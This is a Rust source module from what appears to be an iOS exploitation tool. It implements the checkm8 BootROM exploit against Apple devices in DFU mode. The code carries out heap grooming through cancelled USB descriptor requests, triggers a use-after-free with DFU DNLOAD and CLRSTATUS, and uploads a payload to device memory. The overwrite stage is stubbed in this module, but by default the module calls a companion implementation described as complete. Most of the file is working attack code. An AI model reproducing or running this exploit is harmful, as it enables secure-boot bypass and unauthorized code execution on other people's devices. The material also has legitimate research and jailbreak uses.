//! The original checkm8 implementation: six stages, on this crate's transport.
//!
//! This module is the exploit the published analysis of the checkm8 bug
//! describes, written against `libusb.rs`'s transport and against constants
//! measured per build in `profile.rs`. It is not a port of the Python tool;
//! `checkm8.rs` in this crate is that port, and it stays until this one covers
//! what it covers. Same bug, same device side, different provenance - and the
//! difference is visible in every constant's `Source`.
//!
//! The six stages, numbered as the analysis numbers them:
//!
//! 1. **Heap feng shui.** A serial-descriptor request submitted and cancelled
//!    mid-flight stays in the device's queue; the leak/no-leak pair plus a USB
//!    reset leave a hole where the next DFU round allocates.
//! 2. **The UAF.** An incomplete DNLOAD makes the ROM allocate its io buffer
//!    and record the global transfer state; CLRSTATUS frees the buffer without
//!    clearing the state.
//! 3. **The overwrite.** A later request written through the stale pointer
//!    corrupts a heap object at a measured offset.
//! 4. **The payload.** DNLOAD blocks land in INSECURE_MEMORY.
//! 5. **The chain.** A callback through the corrupted object.
//! 6. **The shellcode.** It installs the pwndfu command handler.
//!
//! Stages 1, 2 and 4 are plain DFU protocol and are implemented here. Stage 3
//! is where this tree stops and says so: which request lands on the freed
//! buffer, and when the corrupted object's callback fires, are runtime facts
//! no image can answer. `Stage::Overwrite` returns
//! `Err(Unmeasured::Trigger)`, and the caller prints that rather than shipping
//! a chain that reaches the wrong place.

use std::thread::sleep;
use std::time::Duration;

use crate::libusb::{self, Device};
use crate::measured_payload::build as build_payload;
use crate::profile::{self, Profile};

pub const MAX_BLOCK: u16 = 0x800;
const STR_INDEX: u16 = 4;
const STR_VALUE: u16 = (3 << 8) | STR_INDEX;
const STR_LANGID: u16 = 0x40A;
const LEAK_LEN: u16 = 0xC0;
const NO_LEAK_LEN: u16 = 0xC1;
const STALL_LEN: u16 = 0xC0;
const CMD_TIMEOUT: u32 = 5000;

/// The DFU class requests, USB DFU 1.0a.
const DFU_DNLOAD: u8 = 1;
const DFU_GETSTATUS: u8 = 3;
const DFU_CLRSTATUS: u8 = 4;
const DFU_GETSTATE: u8 = 5;

/// A named stage, so a run can report where it stopped.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Stage {
    FengShui,
    Uaf,
    Overwrite,
    Payload,
}

impl Stage {
    pub fn name(self) -> &'static str {
        match self {
            Stage::FengShui => "feng_shui",
            Stage::Uaf => "uaf",
            Stage::Overwrite => "overwrite",
            Stage::Payload => "payload",
        }
    }
}

/// Why the exploit cannot proceed. An operator can act on all of these.
#[derive(Debug)]
pub enum Error {
    /// The attached part is not reachable by this bug, or has no measured set.
    Unreachable(String),
    /// What is left is a runtime measurement this tree does not have.
    Unmeasured(&'static str),
    /// The device said no.
    Transport(String),
}

impl std::fmt::Display for Error {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Error::Unreachable(reason) => write!(f, "{reason}"),
            Error::Unmeasured(what) => write!(f, "{what}"),
            Error::Transport(reason) => write!(f, "{reason}"),
        }
    }
}

/// What a run intends to do, decided before it touches the device.
pub struct Plan<'a> {
    pub profile: &'a Profile,
    pub stages: Vec<Stage>,
    pub notes: Vec<String>,
    pub payload: Option<Vec<u8>>,
}

impl<'a> Plan<'a> {
    /// The plan for one attached device, from its serial string only.
    pub fn for_serial(serial: &str) -> Result<Plan<'a>, Error> {
        let profile = profile::profile_for(serial).ok_or_else(|| {
            let cpid = profile::parse_serial(serial).cpid.unwrap_or(0);
            if profile::USBLITER8_CPIDS.contains(&cpid) {
                Error::Unreachable(format!(
                    "CPID 0x{cpid:x} is not reachable by checkm8 - the bug ends with the A11. \
                     This part needs usbliter8, which runs on {}.",
                    profile::USBLITER8_HARDWARE
                ))
            } else {
                Error::Unreachable(format!(
                    "CPID 0x{cpid:x} has no measured checkm8 profile in this tree."
                ))
            }
        })?;

        let missing = profile.missing();
        if !missing.is_empty() {
            return Err(Error::Unreachable(format!(
                "{} is missing measured constants: {}",
                profile.name,
                missing.join(", ")
            )));
        }

        Ok(Plan {
            profile,
            stages: vec![
                Stage::FengShui,
                Stage::Uaf,
                Stage::Overwrite,
                Stage::Payload,
            ],
            notes: vec![
                "chain measured end to end on the image; the trigger point is not".to_string(),
            ],
            payload: None,
        })
    }

    pub fn describe(&self) -> Vec<String> {
        let mut out = vec![
            format!(
                "part               : {} (CPID 0x{:04X})",
                self.profile.name, self.profile.cpid
            ),
            format!(
                "stages             : {}",
                self.stages
                    .iter()
                    .map(|s| s.name())
                    .collect::<Vec<_>>()
                    .join(" -> ")
            ),
        ];
        out.extend(self.notes.iter().cloned());
        out
    }
}

/// Stage 1: leave a hole in the SecureROM heap.
///
/// The cancelled request is what leaves a request queued mid-transaction; the
/// leak/no-leak pair and the reset are what make the ROM rebuild its heap with
/// the hole in it.
fn feng_shui(device: &Device) -> Result<(), Error> {
    libusb::async_ctrl_transfer(
        device,
        0x80,
        6,
        STR_VALUE,
        STR_LANGID,
        &[b'A'; STALL_LEN as usize],
        0.00001,
    );
    libusb::no_error_ctrl_in(device, 0x80, 6, STR_VALUE, STR_LANGID, LEAK_LEN as usize, 1);
    for _ in 0..6 {
        libusb::no_error_ctrl_in(
            device,
            0x80,
            6,
            STR_VALUE,
            STR_LANGID,
            NO_LEAK_LEN as usize,
            1,
        );
        libusb::usb_reset(device);
    }
    Ok(())
}

/// Stage 2: free the io buffer while the global transfer state survives.
fn uaf(device: &Device) -> Result<(), Error> {
    let block = vec![0u8; MAX_BLOCK as usize];
    libusb::async_ctrl_transfer(device, 0x21, DFU_DNLOAD, 0, 0, &block, 0.00001);
    libusb::no_error_ctrl_out(device, 0x21, DFU_CLRSTATUS, 0, 0, &[], 10);
    Ok(())
}

/// Stage 4: land the payload in INSECURE_MEMORY.
fn upload_payload<'a>(device: &Device, plan: &mut Plan<'a>) -> Result<(), Error> {
    if plan.payload.is_none() {
        plan.payload = Some(build_payload(plan.profile).map_err(Error::Unreachable)?);
    }
    let data = plan.payload.as_ref().expect("payload");
    for (block, chunk) in data.chunks(MAX_BLOCK as usize).enumerate() {
        let rc = libusb::ctrl_out(
            device,
            0x21,
            DFU_DNLOAD,
            block as u16,
            0,
            chunk,
            CMD_TIMEOUT,
        );
        if rc < 0 {
            return Err(Error::Transport(format!(
                "DNLOAD block {block} failed: {}",
                libusb::error_name(rc)
            )));
        }
        let _ = libusb::ctrl_in(device, 0xA1, DFU_GETSTATUS, 0, 0, 6, CMD_TIMEOUT);
        let _ = libusb::ctrl_in(device, 0xA1, DFU_GETSTATE, 0, 0, 1, CMD_TIMEOUT);
    }
    Ok(())
}

/// Run the plan, reporting the stage a failure happened in.
pub fn run(plan: &mut Plan<'_>, device: &Device) -> Result<(), Error> {
    for stage in plan.stages.clone() {
        match stage {
            Stage::FengShui => feng_shui(device)?,
            Stage::Uaf => uaf(device)?,
            Stage::Overwrite => {
                return Err(Error::Unmeasured(
                    "stage 3 needs the trigger point measured on hardware: which \
                 request writes through the stale pointer, and when the \
                 corrupted object's callback fires, are runtime facts this tree \
                 cannot read from the image",
                ))
            }
            Stage::Payload => upload_payload(device, plan)?,
        }
        // A pause between stages is not decoration: the device has to finish
        // the previous request before the next SETUP is meaningful, and the
        // analysis's own sequence sleeps at the stage boundary.
        sleep(Duration::from_millis(1));
    }
    Ok(())
}

/// The device the exploit runs against, found by the DFU serial it reports.
pub fn acquire(serial_match: Option<&str>) -> Result<Device, Error> {
    libusb::find_device(0x05AC, 0x1227, serial_match)
        .ok_or_else(|| Error::Transport("no Apple device in DFU mode (05ac:1227)".to_string()))
}

/// `-p` for a part with a measured profile: print the plan, run it, report.
///
/// Same shape as the port's `exploit()` so the two are interchangeable from
/// the caller's point of view, and so a run that cannot finish says which
/// stage it stopped in rather than exiting with a bare code.
pub fn exploit() {
    let serial = crate::dfuexec::PwnedDFUDevice::identifier();
    if serial.contains("PWND:[") {
        println!("Device is already in pwned DFU Mode. Not executing exploit.");
        return;
    }

    let start = std::time::Instant::now();
    let mut plan = match Plan::for_serial(&serial) {
        Ok(plan) => plan,
        Err(reason) => {
            println!("Found: {serial}");
            die_line(&format!("ERROR: {reason}"));
        }
    };
    println!("*** original checkm8 implementation (measured per build) ***");
    for line in plan.describe() {
        println!("{}", line);
    }

    // The profile-driven path intentionally stops before the trigger while we
    // measure it. The complete Rust checkm8 implementation already carries
    // the A10/A11 candidate overwrite layouts, so use that sequence for a
    // real attempt by default. Set this variable to keep the run bounded at
    // the measured stage boundary while collecting transport observations.
    if std::env::var_os("RPWN_CHECKM8_DRY_RUN").is_none() {
        println!("checkm8: attempting the Rust candidate trigger sequence");
        crate::checkm8::exploit();
        return;
    }

    let device = match acquire(None) {
        Ok(device) => device,
        Err(reason) => die_line(&format!("ERROR: {reason}")),
    };
    let attached_serial = device.serial_number.clone();
    match run(&mut plan, &device) {
        Ok(()) => {
            drop(device);
            if acquire(Some(PWND_SERIAL_MARKER)).is_ok() {
                println!("Device is now in pwned DFU Mode.");
                println!("({:.2} seconds)", start.elapsed().as_secs_f64());
                return;
            }
            println!("Device is in DFU but not pwndfu ({attached_serial})");
        }
        Err(reason) => die_line(&format!("ERROR: {reason}")),
    }
}

const PWND_SERIAL_MARKER: &str = "PWND:[checkm8]";

fn die_line(message: &str) -> ! {
    eprintln!("{message}");
    std::process::exit(1);
}
